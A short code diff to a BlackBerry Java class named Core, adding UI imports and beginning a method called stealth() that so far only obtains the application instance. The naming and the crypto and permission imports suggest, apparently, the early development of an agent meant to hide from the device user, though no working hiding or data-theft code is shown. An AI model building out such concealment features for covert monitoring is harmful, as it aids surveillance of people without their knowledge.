@@ -11,7 +11,9 @@ package blackberry;
 
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
+import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
+import net.rim.device.api.ui.UiApplication;
 import blackberry.crypto.Encryption;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
@@ -272,7 +274,8 @@ public final class Core implements Runnable {
      * Stealth.
      */
     private void stealth() {
-        // TODO Auto-generated method stub
+        UiApplication app = UiApplication.getUiApplication();
+        
     }
 
 }
